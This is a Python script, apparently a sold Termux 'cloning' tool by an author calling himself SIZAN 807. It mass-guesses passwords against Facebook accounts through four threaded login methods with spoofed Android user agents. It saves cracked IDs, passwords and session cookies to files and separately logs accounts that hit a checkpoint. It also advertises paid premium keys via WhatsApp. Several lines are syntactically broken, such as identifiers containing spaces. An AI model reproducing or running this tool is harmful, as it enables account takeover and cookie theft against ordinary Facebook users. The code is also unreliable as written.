#-------------------------WRITTEN BY MR-SIZAN 807--------------
#-------------------------- Code by MR-ERROR&SIZAN 807-----------
#-------------------Hello World -----------------------------
#SC MAKED BY SIZAN 807
import os
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO SIZAN 807 WORLD         ')
...
from concurrent.futures import ThreadPoolExecutor as SiamSIZAN 807
from string import * 
...
totaldmp = 0
filter = []
os.system("xdg-open https://m.me/SIZAN 807bevies")
sys.stdout.write('\x1b]2;SIZAN 807\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
folder_path = '/sdcard/MR:SIZAN 807'
try:
...
_______________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:SIZAN 807\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            SIZAN 807 BE'VIBES
\033[1;92m Facebook:            SIZAN 807 
\033[1;92m Github  :            Error_807
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        exit()
os.system("xd-open https://facebook.com/SIZAN 807bevies")
def menu():   
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;196m[\x1b[1;92m1\x1b[38;5;196m] \033[38;5;46mFile Cloneing-OFF🚫')
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+8801916106221');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        SIZAN 807(allkey)
       # os.system('xdg-open https://wa.me/+8801916106221')
#---------------------[ USER - AGENT ] -------------------#
def uaxxx():
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSIZAN 807😈-XD-M1\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SIZAN 807b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SIZAN 807b};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSIZAN 807-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/SIZAN 807/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SIZAN 807/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [SIZAN 807😈-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SIZAN 807/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSIZAN 807-XD-M3\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SIZAN 807/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SIZAN 807/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [SIZAN 807😈-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SIZAN 807/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSIZAN 807😈-XD-M2\33[1;92m] %s | \033[1;92mOK✅:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//SIZAN 807/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SIZAN 807/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [SIZAN 807-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SIZAN 807/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mSIZAN 807-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SIZAN 807/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SIZAN 807/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//SIZAN 807/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamSIZAN 807(max_workers=30) as SIZAN 807world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SIZAN 807world.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SIZAN 807world.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SIZAN 807world.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SIZAN 807world.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
        ...
        for ps in pwx:
          ...
          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SIZAN 807😈-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎🍪]\033[0;33m COOKIES = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('SIZAN 807-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SIZAN 807😈-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SIZAN 807-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[SIZAN 807😈]\033[1;92m] %s|\33[1;31m[OK✅]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('SIZAN 8071x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    ...
    try:
        ...
        if Xyteee in system:
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : SIZAN 807 Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+8801522132623&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi SIZAN 807 Sir, I Need To Buy Your SIZAN 807 Tools Version 0.1Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with SiamSIZAN 807(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)